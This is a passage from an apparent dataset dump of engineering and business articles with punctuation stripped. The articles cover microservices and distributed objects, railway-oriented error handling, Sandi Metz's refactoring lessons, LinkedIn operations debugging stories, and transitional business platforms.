become an undifferentiated commodity  Amazon  or someone  will offer it as a service   Eventually that thing you are spending all your time working on  someone else will do it for cheaper and do it better   What I Wish I Knew   if people are working on some kind of platform type feature it doesn t sound good to hear Amazon has just released your thing as a service  You still try to rationalize why you should use your own private thing as a service  It turns out there are people on the other end of those text editors  There are vast differences in how people make judgements about the build buy tradeoff     Politics  By breaking everything up into small services it allows people to play politics   Politics happen whenever you make a decision that violates this property  Company   Team   Self  You put the values of your self above the team  The values of the team are put above the company   Politics isn t just a decision you don t like   By embracing highly modularized rapid development  hiring people very quickly  and releasing features as quickly as you can  there s a temptation to start violating this property  When you value shipping things in smaller individual accomplishments it can be harder to prioritize what is better for the company  A surprising tradeoff     Tradeoffs  Everything is a tradeoff   What I Wish I Knew   how to better make these tradeoffs intentionally  When things are happening without an explicit decision because it seems like this is just the way things are going  think about what tradeoffs are being made  even if the decisions are not explicitly being made,"[778 1351 673 61 1405 234 952 1300 92 1373 281]"
794,training-dataset/engineering/520.txt,engineering,Microservices and the First Law of Distributed ObjectsNote  This is an essay I wrote as the basis for a talk I ve given for GOTO Chicago in February 2017  You can find the original slides here or watch the video below   GOTO Nights   Devops Chicago   2017 02 27   Phil Calc ado on Microservices vs The First Law of Object Design from Spantree Technology Group  LLC on Vimeo   In the late 90s and early 2000s  this industry was obsessed with what is usually called  distributed objects   I believe that this came to be when the cost of acquiring a second server became less than a second senior programmer  In what s maybe a weird variant of Conway s Law  we decided that  instead of trying to write more efficient software to run on a single server  we would rather divide the software across many machines remember  this is before multicores was a thing and back when Linux only had userland threads   This was the golden age of middleware vendors  so surely soon each vendor decided to push their own solution for the problem  Over the years we were introduced to CORBA  DCOM  EJBs  RMI  and several others  These frameworks and platforms all offered some flavour of  transparent  distribution  often by generating boilerplate code based on metadata   The problem is that this transparency was never real  To illustrate some of the problems with this claim  let me use an example from the meatspace   I used to live in Australia  and once ThoughtWortks allocated me in a project that would be developed between a big bank s Sydney and London offices  As you might know from their published material  ThoughtWorks really values high bandwidth communication and co location for team members we would always prefer a two minutes conversation over a Jira ticket  The problem is that the client s contact management system  I believe it was Microsoft Exchange  wasn t configured to let us know in which office a person was based  This led the Australian team to randomly call London team members at 3 am their time  and vice versa  After a while  we established a protocol  we d have one scheduled call a week  and any ad hoc calls required confirmation by email with 24 hours notice   Now this is usually the moment when engineers start yelling  remote first 111one    but bear with me for a second  Firstly  this was 2007 and technology wasn t as friendly towards remote collaboration as it is now no Google docs or Hangouts  not many people had fancy phones  But more importantly  there was a more fundamental problem  one that is the same we experience with distributed objects   You see  object orientation is about splitting a problem into very tiny pieces  These pieces are so small that the only way in that they can accomplish anything is by passing messages between each other  That s not too different from a team of software engineers  product owners  and others trying to build a system  The challenges faced in the example above are very much present in any distributed object system  Putting a continent between two people is similar to putting a network between two objects  organic communication isn t cheap and you will often have to follow a protocol with various layers of error correction and pay the overhead price   After various attempts by the industry at solving this problem via innovations in the underlying technology and hardware  at some point the practitioners decided that they had it with all this mess  An iconic artefact of these times is Martin Fowler s First Law of Distributed Objects  Don t   Fast forward ten years and here we are  getting ready for another GOTO Chicago and the conference schedule has 16 occurrences of the word microservice  Microservice is yet another one of those terms in software engineering that don t have a precise definition but is still useful  If I say to you  DigitalOcean is migrating from a monolithic to a microservices architecture   you might not know what my actual definition of microservice is  but you can imagine that the work we are doing there is similar to what other folks like SoundCloud  Netflix  and various others have reported on  The term creates some basic shared understanding  and that in itself already makes it useful   And this basic shared understanding of what is a microservice have us collectively know that these things are meant to be small pieces of software that collaborate to achieve a goal  That sounds familiar as we just discussed a similar definition for objects  but here s the catch  microservices are meant to be distributed over a network of sorts   It is very easy to be cynical and shrug the whole thing as yet another instance of everything old is new again  but let s assume for the sake of this text that there are actual benefits to a microservices architecture if you want to know more about what these would be I suggest you attend some of the 16 talks about it at the conference next month   But even if we agree that microservices are desirable  how is it ok for them to break Martin s First Law without ceremony and be applauded by us  I would argue that there are two main factors that lead us to this conclusion   On the technology side  twenty years of improvements in hardware and software made it such that the cost benefit of calls between different servers is much cheaper  The largest benefits come from two decades of improvements in computer architecture  networks  and basic software Moore s trinity when it comes to any distributed system  But by giving up on a lot of the magic promised by vendors  we practitioners were able to create more efficient and faster cross language serialisation formats and RPC protocols   These improvements don t make communication between two distributed pieces of software  objects  services  applications  or whatever unit of composition you fancy  free of cost  but when you take into consideration the various other costs and complexities around software engineering from the ever decreasing cost of hardware to how cloud computing works to how finding and hiring senior engineers now is even harder than before the return on investment is very attractive to a certain class of organisations   But don t get me wrong  I am not saying that those improvements are enough for us to go back to distributed objects  In fact  I would argue that Martin s Law should be not about the performance or even coding overhead of distribution  but about how objects are not a good unit of distribution   Objects are too small and chatty to be good network citizens  but this tends to stem from the fact that a well modelled object won t be able to do almost anything on its own  it will always have some strong dependency on its neighbouring objects  Every time you need to make even a small change or refactoring in your system you will need to touch multiple different objects  and if these objects are distributed you then need to manage the complexities of rolling out a widely distributed system every time you want to change the name of a class or method   Services  on the other hand  are meant to be more coarse grained  This should help us avoid falling into the distributed object traps  but unfortunately  our confusing but useful term microservices introduces a new challenge with the prefix micro   As an industry  we ve been practising flavours of Service Oriented Architecture for several decades now  As we mentioned before  this flavour generally known as microservices doesn t haver a widely accepted definition  but there is a consensus that they should be small  The reader won t be surprised to find out that the term small also lacks proper definition  Whatever it means in practice is left as an exercise to be performed by each team or individual   In my experience  teams always struggle in trying to find where in the spectrum between a monolith and an object their services should live  Maybe we could use a simplification of Martin s Law as a rule of thumb to test our services   size    We know we don t want to have a monolith  a single or few systems that package everything from the system in the same software  and we also know that we don t want to have distributed objects  What are other units of abstraction that we can use for services   If you ve played microservices buzzword bingo before  you know that this is probably the point when I would mention Bounded Contexts  I will not disappoint you  dear reader  but before arriving at a conclusion I would like to explore a little bit why this tool can help us here   Eric Evan s popular book Domain Driven Design describes a very interesting pattern language for software  As I understand it  the fundamental rock of his work is a language  the Ubiquitous Language  that is derived from the system s model  Eric is adamant in that the team should share a single language   This might sound familiar to those of us used to enterprise architects and their utopic unified corporative data model projects  This isn t what Eric proposes  though  He acknowledges that a single organisation will have multiple models and subsequently languages  sometimes with conflicting terms to describe the same concept  To manage this situation  he suggests that we explicitly define the boundaries between these models  to  keep the model strictly consistent within these bounds  but don t be distracted or confused by issues outside  it     So maybe one way to go about defining what is a good enough service is starting with the language you are modelling  From there  you should cluster related terms  and try to identify places where different terms are used to model similar concepts  You should then be able to identify some stronger and weaker relationships between clusters and terms maybe the relationship between user  group  and login is stronger than the relationship between user and warehouse   Once you identify the different relationships  you should be able to draw a boundary between them  effectively discovering your Bounded Contexts  Importantly  you should not try to normalise the vocabulary across all Bounded Contexts  instead  you should make any necessary translation between them intentional  explicit  and testable   One of the reasons that I like this approach is because  in my experience  these strong relationships correlate with very chatty communication between the objects that implement the concepts  If you are able to identify and isolate these clusters not only you will be able to create a consistent and robust model  but you are also given an actionable blueprint on potential services to create or extract from a monolith   As mentioned before  I find that this approach and general philosophy works very well for some class of organisations  especially those who started as a monolith and now need to reduce time to market by extracting services from the big blob of legacy code  There are many occasions where this approach isn t adequate or breaks down  though   When you are still a small organisation or startup  all this complexity probably doesn t make sense  Just keep focused on validating your business and product  Use whatever tools and architectures will help you validate it as soon as possible  Once you have properly sustained growth you can try to apply this to refactor the existing systems   For larger   web scale  organisations  the model can also be challenging  At some level of scale and growth  the return on investment mentioned before doesn t apply anymore  At this stage  very often you need to shape your internal services  not after maintainability or approachability  but rather performance  cost  and reliability requirements  These tend to be more extreme than any rule of thumb as the one proposed here can help with   For companies right in the middle of their journeys not too little to afford not thinking about it and not too big to have extreme requirements the approach above has served me well through several hyper growth phases  Until it breaks down and we go back to the drawing board,"[794 278 773 61 234 778 1405 1377 1351 60 1159]"
795,training-dataset/engineering/508.txt,engineering,Railway Oriented ProgrammingRailway Oriented Programming Slides and videos explaining a functional approach to error handling Tweet  This page contains links to the slides and code from my talk  Railway Oriented Programming    Here s the blurb for the talk   Many examples in functional programming assume that you are always on the  happy path   But to create a robust real world application you must deal with validation  logging  network and service errors  and other annoyances     So  how do you handle all this in a clean functional way     This talk will provide a brief introduction to this topic  using a fun and easy to understand railway analogy   I am also planning to upload some posts on these topics soon  Meanwhile  please see the recipe for a functional app series  which covers similar ground   If you want to to see some real code  I have created this project on Github that compares normal C  with F  using the ROP approach  Slides  Slides from Functional Programming eXchange  March 14  2014  The powerpoint slides are also available from Github  Feel free to borrow from them   Videos  I presented on this topic at NDC London 2014  click image to view video   Other videos of this talk are available are from NDC Oslo 2014 and Functional Programming eXchange  2014  Relationship to the Either monad and Kleisli composition  Any Haskellers reading this will immediately recognize this approach as the Either type  specialized to use a list of a custom error type for the Left case  In Haskell  something like  type TwoTrack a b   Either  a   b  a    I m certainly not trying to claim that I invented this approach at all  although I do lay claim to the silly analogy   So why did I not use the standard Haskell terminology   First  this post is not trying to be a monad tutorial  but is instead focused on solving the specific problem of error handling   Most people coming to F  are not familiar with monads  I d rather present an approach that is visual  non intimidating  and generally more intuitive for many people   I am strong believer in a  begin with the concrete  and move to the abstract  pedagogical approach  In my experience  once you are familiar with this particular approach  the higher level abstractions are easier to grasp later   Second  I would be incorrect to claim that my two track type with bind is a monad anyway    a monad is more complicated than that  and I just didn t want to get into the monad laws here   Third  and most importantly  Either is too general a concept  I wanted to present a recipe  not a tool   For example  if I want a recipe for making a loaf of bread  saying  just use flour and an oven  is not very helpful   And so  in the same way  if I want a recipe for handling errors  saying  just use Either with bind  is not very helpful   So  in this approach  I m presenting a whole series of techniques   Using a list of custom error types on both the left and right sides of Either  rather than  say  Either String a         bind          for integrating monadic functions into the pipeline     for integrating monadic functions into the pipeline  Kleisli composition         for composing monadic functions     for composing monadic functions   map    fmap   for integrating non monadic functions into the pipeline     for integrating non monadic functions into the pipeline   tee  for integrating unit functions into the pipeline  because F  doesn t use the IO monad    Mapping from exceptions to error cases       for combining monadic functions in parallel  e g  for validation    for combining monadic functions in parallel  e g  for validation   The benefits of custom error types for domain driven design   And obvious extensions for logging  domain events  compensating transactions  and more   I hope you can see that this is a more comprehensive approach than  just use the Either monad    My goal here is to provide a template that is versatile enough to be used in almost all situations  yet constrained enough to enforce a consistent style  That is  there is basically only one way to write the code  This is extremely helpful to anyone who has to maintain the code later  as they can immediately understand how it is put together   I m not saying that this is the only way to do it  But I think this approach is a good start   As an aside  even in the Haskell community there is no consistent approach to error handling  which can make things confusing for beginners  I know that there is a lot of content about the individual error handling techniques  but I m not aware of a document that brings all these tools together in a comprehensive way   How can I use this in my own code   If you want a ready made F  library that works with NuGet  check out the Chessie project   If you want to see a sample web service using these techniques  I have created a project on GitHub   You can also see the ROP approach applied to FizzBuzz   F  does not have type classes  and so you don t really have a reusable way to do monads  although the FSharpX library has a useful approach   This means the Rop fs library defines all its functions from scratch   In some ways though  this isolation can be helpful because there are no external dependencies at all    Further reading   One bind does not a monad make     Aristotle  As I mentioned above  one reason why I stayed away from monads is that defining a monad correctly is not just a matter of implementing  bind  and  return   It is an algebraic structure that needs to obey the monad laws  which in turn are just the monoid laws in a specific situation  and that was a path I did not want to head down in this particular talk   However if you are interested in more detail on Either and Kleisi composition  here are some links that might be useful   Comments  Please enable JavaScript to view the comments powered by Disqus   Disqus,"[795 884 314 778 300 1205 1351 794 1159 234 1217]"
800,training-dataset/engineering/1150.txt,engineering,5 lessons in object oriented design from Sandi MetzI first heard Sandi Metz speak at a meetup in San Francisco in 2012  One thing she said that night had a profound impact on me   Code needs to work today just once  but needs to be easy to change forever    At that point  I d been writing code for a couple of years and understood that  refactoring  was a good thing  But  like so many other lessons I learned as a beginner  I did not really understand the why of refactoring  And there it was  plain as can be  code needs to be refactored so that it s easier to change in the future   If a program I was writing never needed to change  refactoring would be pointless  The minute it started working  no matter how crazy and jumbled it looked in my text editor  I could walk away from the keyboard and be satisfied with my code  But in reality  things always change  In the world of software  people constantly want to change  add  and remove functionality  That s what it is to write code  So we must refactor  We don t change code to make it better  we change it to make it easier to change in the future   Last month  I completed Sandi s object oriented design course  It was three intense days of working through refactoring exercises and discussing code as a group with my class of 30 students  I got a ton out of the class and returned to my work at 18F excited to practice what I d learned  I ve rounded up my top lessons from the course for you to enjoy   1  The purpose of design is to reduce the cost of change  This lesson is similar to the idea of refactoring code so that it can  change forever  but focused on the business value of making code easy to change  Many people think about refactoring as a bonus step or something they will get to  later when there s time   But constant refactoring is central to the goals of any organization that produces software  Without refactoring  you cannot have well designed software  Well designed software is easier to change  Things that are easier to change take less time to change  Less time means less money spent   Some people might think  but hey  refactoring takes time  and the faster I can deliver this feature  the better   In some cases  as Sandi said  this is true  If your business is going to fail tomorrow if you don t deliver a feature today  then by all means write some crappy code and deploy to production  But if you re working on a codebase that s going to be around for an indefinite time in the future  you need to focus on the long term consequences of today s actions  If you re writing poorly designed code in order to save time now  you need to ask yourself  are you really saving your organization money by shipping features faster  or costing them more down the line by writing code that will be hard to change   2  Reach for the lowest hanging green  In our first exercise of the course  Sandi asked us to write a Ruby script to make a file of automated tests pass  This script needed to sing any verse of the song  99 bottles of beer on the wall  given a verse number   I consider myself to be someone who is fine with doing things the  easy  way  I always say  just get it working first and then make it better   So I started by writing the code to make the first verse  for 99 bottles  work  Then I started writing the code for verse 1  where I used interpolation to determine the bottle number and noticed that the word  bottles  needed to be singularized to  bottle  so I wrote a little conditional for that  The second part of that verse is also different  so I wrote another conditional  And then I got to the  zero  verse  which required another conditional  And then another  And another   Pretty soon  I had a 40 line method that was incredibly confusing  And this was just code to write a simple song  And I thought I was writing it the easiest way possible   class Bottles def verse   number   if number   1    0 next_number    no more  else next_number   number   1 end if number   1    1 next_bottle    bottle  else next_bottle    bottles  end if number    1 bottle        number   bottle  elsif number    0 bottle    no more bottles  else bottle        number   bottles  end if number    1 pronoun    it  else pronoun    one  end if number    0 second_verse    Go to the store and buy some more       99 bottles of beer on the wall     else second_verse    Take    pronoun   down and pass it around           next_number      next_bottle   of beer on the wall     end      bottle   capitalize   of beer on the wall           bottle   of beer       second_verse end end  Time for shameless green  When we finished this exercise  Sandi taught us about the concept of  shameless green   do the easiest thing possible to get your tests to pass  turn green   This state is called  shameless  green because your goal is just to get the tests to pass  nothing more  You might be embarrassed by the code that you write to do this because it seems too simple to be written by someone with your level of intelligence  Then  and only then  you can abstract logic   In the case of 99 bottles  shameless green means not worrying about doing fancy logic for the verses that don t look like the others  Instead  it uses a conditional to print different strings   class Bottles def verse   number   case number when 0  No more bottles of beer on the wall  no more bottles of beer   Go to the store and buy some more  99 bottles of beer on the wall     when 1  1 bottle of beer on the wall  1 bottle of beer   Take it down and pass it around  no more bottles of beer on the wall     when 2  2 bottles of beer on the wall  2 bottles of beer   Take one down and pass it around  1 bottle of beer on the wall     else      number   bottles of beer on the wall     number   bottles of beer   Take one down and pass it around     number   1   bottles of beer on the wall     end end end  Developers love to write clever code  and in the case of the 99 bottles exercise  I was no exception  Rather than saying to myself  OK  verses 1 and 0 are different  I will print a different string in those cases   I immediately tried to use the same string with interpolation to work for every verse  The resulting code  while certainly a rough draft  was both a poorly designed implementation and nearly impossible to understand   When you start with shameless green  you start with something that may have a ton of duplication but is very easy to understand  At that point  you might consider the feature done  This might seem counter to the first point about writing well designed code  but it isn t  The way I initially approached the problem was an inelegant solution but hard to understand  Shameless green is an inelegant solution that is easy to understand  Always start with shameless green  and then extract methods and objects once there are product requirements that will be hard to implement with your shameless green solution  That s the path to well designed code   3  Duplication is far cheaper than the wrong abstraction  One reason it s so hard to start with shameless green is that it usually includes a large amount of duplication  Think about it this way  one way to solve the 99 bottles problem would be to write a 202 line method that returns a completely different string for each number passed in  When I first tried my hand at the problem  I went the complete opposite direction  zero duplication  And my code immediately became difficult to understand   When it comes to duplication  DRYing up code too early frequently leads to code that s harder to design  Here s why  whenever you remove duplication  you re creating an abstraction  Like in my first attempt at the bottles exercise  I created various conditions that returned values based on the number passed in  In order to use those values in the string  I had to give them a name  So I was naming values before I even understood what they were   Here s an example  in the 99 bottles song  verses start with a number and that number goes down by one in the second part of the verse  So when I wrote the conditional for that  down by one  value  I called it next_number   When you get to the verse for  1   however  the next_number becomes the string  no more    No more  is not a number  By coming up with a method name before implementing shameless green  I was giving an inaccurate name to a concept   You might argue that giving something the wrong name is not a big deal  Just rename the method  right  Yes and no  Yes  the method can be renamed  No  naming it early is not without harmful consequences  Moving from one abstraction to a different abstraction is much harder than moving from a concretion  such as a duplicate string  to an abstraction  When we see all of the duplicate elements in front of us  we have a much better chance of coming up with a proper name for that duplication  When we name two pieces and a third doesn t fit  it s much harder to rewind our thinking and come up with the appropriate abstraction  Instead  we re likely to try and jam the new use case into our existing abstraction  And in doing so  we re making our code harder to understand and therefore harder to change in the future   Removing duplication is not always the wrong choice  For example  in the shameless green bottles example  97 of the 100 possible verses work in the else condition of the case statement  we didn t type out all 100 verses   But removing duplication is also not always good  DRY is one of the first concepts you learn when you start coding  It s a good one to learn early because humans are natural pattern matchers  and even novices can quickly identify duplicate logic in their code  But what I learned in Sandi s workshop is that in many cases  having some duplication is better than having zero duplication with code that is hard to understand   4  Refactoring code should be safe and boring  Sandi s methods all depend on having a test suite that tells you if your code is working as you expect it to  Many developers know the adage  red  green  refactor   This means you start with a failing test  red   write code to make the test pass  green   then change the code to make it better  refactor    Typically  when I get to the refactor phase  I make a handful of small changes  then re run my tests  At that point  it s common to find that my changes have broken something that was previously working  Now I become a detective on a mission to discover what I ve done to cause the breakage  This process is oftentimes risky and exciting  Risky because figuring out what I ve done to break the code s functionality frequently takes longer than making the breaking change took in the first place  Exciting because I m writing a lot of code  which is fun  whereas running tests isn t all that fun  Put otherwise  my previous refactoring method  was the refactoring equivalent of  move fast and break things   Refactoring in a big flurry is exciting because you do a bunch at once and  for developers at least  writing a bunch of code is super fun    Red  green  infinity green   In Sandi s object oriented design class  we followed a strict pattern when refactoring that I like to call  red  green  infinity green   In this process  we d start with a failing tests  make it pass  with shameless green   and then refactor  But during our refactor  we d run the tests after every  single  change  This means that you cannot move code to a new location and delete it at the old location and then run the tests  First you copy the code and paste it into the new location  Then you run the tests  If they are still passing  you remove the old code  Then you run the tests  If they are still passing  then you move onto the next change  If at any point the tests fail  you undo the last change  make sure the tests are green again  and then make a different change that allows the test suite to stay green  If that different change passes  then you can move to the next change  And so on and so on   If this sounds tedious  it s because it is  It s what Sandi calls  safe and boring   But there s immense value in safe and boring  First of all  you always know exactly what caused your tests to fail  When you run the tests every few minutes  you might end up with a broken test suite and no idea why it s broken  It s not uncommon to spend longer debugging a change made during a refactor than you spent on the refactor itself  While this detective work can be fun and stimulating  it s also time intensive  which means it s expensive  With the  safe and boring  method of running the tests after each change  you always know exactly which change caused the breakage  Because it s just one undo away   Furthermore  the rhythm of running the tests after each change forces you to make small  understandable changes  One mistake I make all the time while refactoring is that I see a  shiny object  in the code that I want to change  and I get distracted from my original refactor and end up changing things that are unrelated to my current set of work  This is not only problematic in the context of code review  where it s much better to submit cohesive bits of code  but it also leads to situations where far too much has changed and I no longer know what I m doing  By focusing on changing one small thing at time  there is zero need for detective work and much lower risk of changing code that is unrelated to the current matter at hand   Not all of writing code needs to be safe and boring  But by doing refactoring in an  infinity green  state  you ensure that there is more time and energy left for the truly exciting tasks  Let refactoring be a place to fall into the gentle rhythm of make a change  run the tests  make a change  run the tests   5  Write the best code possible today and be completely unattached to it and willing to delete it tomorrow  Fact  developers spend far more time changing existing code than they do writing new code  While we spend a lot of time thinking about exciting new features  the reality is that most of our work involves changing stuff that s already there  Even those of us who are on relatively new codebases rarely find ourselves writing code that doesn t require changes to existing code  Oftentimes  that existing code is something we ourselves wrote  Maybe months ago  Maybe days ago  Maybe even hours ago   To be an object oriented design pro like Sandi Metz  you need to have complete non attachment to the code you ve written  Due to the sunk cost fallacy  many of us have a hard time with this  We think   I spent so long writing that  It works  It s beautiful  I can t delete it   But changing requirements means that your code might need a different design  which means removing attachment from existing implementations in order to make them open to new requirements   There is no such thing as perfect code  just code that works for the needs of today  You can never predict the needs of tomorrow  Nor should you  since that leads to premature abstraction  But when a new requirement comes in that requires completely rethinking a solution you came up with the day before  the only course of action is to practice complete non attachment to the existing implementation and rethink your design so that the code can continue to be easy to change forever,"[800 1252 1225 1235 683 806 778 206 656 1217 713]"
806,training-dataset/product/962.txt,product,Every Day Is Monday In OperationsThis post is part of the series  Every Day Is Monday in Operations   Throughout this series we discuss our challenges  share our war stories  and walk through the learnings we ve gained as Operations leaders  You can read the introduction and find links to the rest of the series here   We live in a world where our online services never sleep  Those of us who build and operate the services  however  do need to sleep so ideally we build  monitor  alert on  and operate our services so that we can  Unfortunately  any service that is live 24 7 is in a state of change 24 7  and with change comes failures  escalations  and maybe even sleepless nights spent firefighting  Since our services must always be available  we must always be ready to answer the call  However  each problem solved is progress towards more restful nights in the future  Read on and we ll share two war stories and lessons learned that explain why every day is Monday in operations   Run the test twice  get two different results   We cannot run the same tests twice and get the same results   One of my very talented Engineering Directors made this comment about a pre production test run before launching to production not good  Blame was placed everywhere  including the code  the build system  the tests  transient test failures  configuration errors  the environment  even bad luck  But as we know  when it comes to testing  luck has nothing to do with it   There is a famous quote in the movie  The Magnificent Seven  where Steve McQueen s character says   We deal in lead  friend    Note  for the uninitiated  he is talking about bullets in guns   Well  I like to think  we deal in bits  friend   and  as it turns out  in our little binary world  we are paid to build predictable systems   So when I heard this from one of our best technical guys  I wanted to poke my eyes out  What do you do in that scenario  Go after each and every problem that is making the system unpredictable  Constantly attack the problem  note  do not attack the personnel    Be relentless  The investment will pay off   Learning from  Run the test twice  get two different results   We titled this piece  Every Day is Monday in Operations  because every time you find a problem and fix it  you are better than you were before  If you can go further  finding and fixing a systematic failure  you will be a lot better than the moment before  But there is no end to this fight  thanks to constant change needed to keep making our site and services better  That s why we have 24 7 personnel to monitor the site  alert us when problems exist  remediate issues  and find better solutions going forward   Betting against the odds  Speaking of systematic failures  let s discuss what happens when you have a 1  chance of segfaulting a process per day and you operate a distributed service on 70 000 servers  As anyone who runs a large distributed system can tell you  the odds are not in your favor  Bugs that seem to have infinitesimally small chances of occurring will nevertheless affect your system constantly   For anyone who didn t already do the mental math  that means that on average  700 segfaults per day will occur  That is a pretty big number of broken processes to deal with  but in the abstract it doesn t sound so bad  still only 1   after all   so let s add some reality into the mix   The big distributed system in our story is SaltStack  a key component of our deployment system  At first we began receiving scattered reports of Salt Minions  the distributed portion of SaltStack that runs on each of our machines  becoming unresponsive but only to deployment requests  Everything else running on the machine continued to work  Over the course of two days  this problem grew from scattered reports until eventually 50  of all deployments were failing due to this behavior and we didn t know why it was happening   We ran through the standard checklist  what had changed  We found no code updates to Salt  no updates to the deployment specific code  no configuration changes  nothing  After tracing the deployment specific subprocesses we finally found it  it wasn t our code at all  or Salt s code  but the Python interpreter itself that was segfaulting  Worse  this was affecting all Python processes across the company but the odds of seeing it were so low that our deployment system  which was constantly spawning Python processes  was the only place it manifested   It took us 750 engineer hours  but we were able to mitigate this problem and identify the cause  a change we didn t know about was made to a related system responsible for distributing shared libraries  This change triggered a bug in a the deployment system allowing a race condition which allowed the Python interpreter could read half written files from disk  Only later would the Python interpreter segfault when it actually tried to call code from these modules   Once we discovered the half written files  it took about 20 minutes to gather debug information and fix the situation on a broken host  Once we fixed this problem  we saved the company about 233 engineer hours per day  In four days  the time investment had paid for itself   Learning from  Betting against the odds   Every day things change  every day things break  and every day is Monday in Operations  We found a bug that had long existed and simply wasn t being triggered until a change exposed it  By fixing this systematic issue  we made our situation much better  Sporadic and supposedly unpredictable failures plaguing Python processes all over LinkedIn vanished overnight   Throughout this process  the engineers did their best and they did not give up  After many red herrings  false leads  and reminders to each other that the code doesn t lie  they got to the bottom of it  If the code worked fine yesterday but stopped working today  that means we haven t cast our net widely enough to find the problem  Once we identified a subsystem that could have this effect  the code explained everything   We didn t know about a change to a related system  Once we knew to look there  the time it took us to isolate and fix the bug was only a few hours  We could have saved about 750 engineer hours by having a more comprehensive list of changes that occurred during a time window   There is never a point in the day when our systems do not change  Whether it is a major code upgrade or just the system clock ticking  change is constant  Some of this change results in failure  The high profile failures get dealt with immediately  roll back the change   but the minor ones  like an integration test that has a 1  increased chance of failure  often slip through the cracks  These minor problems build on top of each other  resulting in a major problem with no obvious single cause  Regardless of the failure type  it is critical that we be aware of changes that occurred around the same time  Without a change set  you have a manhunt   with a change set  you have a police lineup   Today s stories  Run the test twice  get two different results  and  Betting against the odds  were experienced by David Henke and Benjamin Purgason respectively  To ask either of us questions directly  join the conversation here  We ll be checking in on the comments throughout business hours  so let us know what you think,"[806 778 1351 800 92 683 61 1405 673 1235 915]"
809,training-dataset/business/264.txt,business,Does Your Business Model Look to the Future or Just Defend the Present Established industries aren t ripped apart overnight  That takes time  though when momentum builds  change happens fast  How can incumbents manage through the monumental changes currently under way  One answer is to take a cue from pivotal technology companies leading the change   Many of the companies leading today s technology driven transformations across industries are leveraging transitional strategies  or more specifically transitional business platforms  Few old guard players have recognized the power of transitional models  but companies such as Netflix  Uber  Apple  and Tesla know that waiting for the time to be right means waiting until it s too late  Netflix founder Reed Hastings  for instance  always wanted to do on demand video  but the technology infrastructure wasn t there in 1997  the year he founded the company  Rather than giving up  he founded a DVDs by mail business until the time was right  Similarly  Google s interest in Nest isn t primarily a play to control the thermostat  it s a Trojan Horse into the connected home   Getting in the game helps define the game  but it s essential to have some idea   even a vague one   of what the game might eventually be  For the next generation  that game will often be about pushing the production and provision of products and services ever closer to the moment of demand  From distributed energy generation to 3D printing to crowdfunding to the Internet of Things and data analytics  all of these technologies enable us to provide what customers want  where  how  and when they want it  Businesses able to most cost effectively provide it will win  This dynamic will persist for many years as technology improves and businesses learn to apply it in new ways  We re only in the early stages  Companies that focus on defending established business models will lose in the long run  Companies with foresight will pursue transitional models to be part of driving the change   Insight Center The Platform Economy Sponsored by Accenture How online marketplaces are changing the face of business   A transitional business platform such as Netflix s DVD rental business provides a potentially profitable business opportunity that gets to market and enables  rather than hinders  transition to future business models as technologies  customer behaviors  regulations  or other factors evolve   While Uber  the global leader in on demand transportation  relies on thousands of independent drivers  Uber s business platform enables the transition to self driving cars  one of the company s stated strategic priorities  While the eventual transition could be traumatic for Uber s drivers  and to society in general   Uber s business platform enables rapid evolution as technologies  consumer behaviors  and regulations change  At present  traditional auto makers  and limo companies  business models don t account for this inevitable shift  By contrast  electric vehicle company Tesla s software based upgrades provide a superb transitional business platform  allowing the company to be a leader in the autonomous vehicle revolution   To be clear  succeeding at transitional business platforms does not require predicting the future  Instead  a great transitional model is based on an accurate directional read of the future  providing flexibility and optionality as the future unfolds  In 2005  Netflix s Hastings told INC Magazine   I don t want to get into production  There are passionate  talented filmmakers out there  and I would pollute the craft   Yet today  as it evolves to a global media empire  Netflix is a force in content production  Whether Hastings envisioned this from the start is irrelevant  The point is that the Netflix platform has enabled the company to expand its competitive space as technology and consumer behaviors have changed   Four characteristics distinguish transitional business platforms   They substantially outperform the status quo from the customer s perspective  Transitional models are designed around what is best for customers  even at the expense of established value chain participants  For new entrants  like Uber  that s just fine  For traditional players  like limo companies  it s the fundamental challenge  But in a world increasingly giving customers what they want  when  where  and how they want it  it s also a necessity   Transitional models are designed around what is best for customers  even at the expense of established value chain participants  For new entrants  like Uber  that s just fine  For traditional players  like limo companies  it s the fundamental challenge  But in a world increasingly giving customers what they want  when  where  and how they want it  it s also a necessity  They tend to violate traditional constraints  This is often required to achieve radical improvements in performance  Infamously  Uber has challenged local regulators around the world  Whether they ve gone too far in this respect is arguable  It s uncontestable that Uber has transformed personal transportation  Tesla s direct to consumer approach will continue to be contested in court by auto dealers and others  but direct consumer engagement is fundamental to the company s flexibility in the future  Where possible  we believe it s best to avoid violating established constraints   it s easier   but not at the expense of serving customers   This is often required to achieve radical improvements in performance  Infamously  Uber has challenged local regulators around the world  Whether they ve gone too far in this respect is arguable  It s uncontestable that Uber has transformed personal transportation  Tesla s direct to consumer approach will continue to be contested in court by auto dealers and others  but direct consumer engagement is fundamental to the company s flexibility in the future  Where possible  we believe it s best to avoid violating established constraints   it s easier   but not at the expense of serving customers  They build brand presence before markets have been clearly defined  Consider drone delivery services  Amazon is experimenting with drone delivery not just to lead but also to advance drones on the regulatory agenda and to catalyze other companies to develop viable models  While drones are still experimental  expect Amazon or other players to find niche applications in the future that build presence and anticipate the day when delivery drones proliferate   Consider drone delivery services  Amazon is experimenting with drone delivery not just to lead but also to advance drones on the regulatory agenda and to catalyze other companies to develop viable models  While drones are still experimental  expect Amazon or other players to find niche applications in the future that build presence and anticipate the day when delivery drones proliferate  They enable adaptation as conditions change  Most important  transitional models must be designed to adapt as offerings move closer to the time and location of customer demands  This means anticipating the direction  not the details  of customer demands  UPS s Strategic Enterprise Fund has invested in CloudDDM  a 3D printing company with 100 printers located in the middle of UPS s worldwide hub  CloudDDM can print parts on demand and send them literally across the alley to UPS for shipping  allowing a response within 24 hours for many parts  If the setup works  CloudDDM will be positioned to expand into a range of other digitally manufactured products  The investment also positions UPS to participate in and learn about a trend that will both expand and contract demand for their core shipping business  More 3D printed parts today likely means more packages shipping  However  in the future  to the extent that 3D printers proliferate closer to the locations of demand  fewer products might be shipped  CloudDDM and UPS are building a transitional business platform for their diverse yet complementary objectives   Great business leaders use transitional business platforms to learn and react fast  even when new directions threaten the company s traditional core  In January 1996  individual investing pioneer Charles Schwab launched web trading not long after the introduction of the first web browser  Although new entrants such as eTrade were active  Schwab recognized the power of online trading before any of the large incumbents  Schwab offered online trades at  29 95  in person or phone orders remained far more expensive  While online accounts soared  customers expressed increasing frustration at not being able to order through any channel at the same price  Greg Gable  Schwab s senior vice president for public affairs  recalls   The problem quickly became apparent  We had clients revolting  We had employees saying   Hey  we need to do what is right for our customers   So we did   In late 1997  Schwab offered the  29 95 price for all trades  online or otherwise   We expected a considerable hit to revenue  We prepared 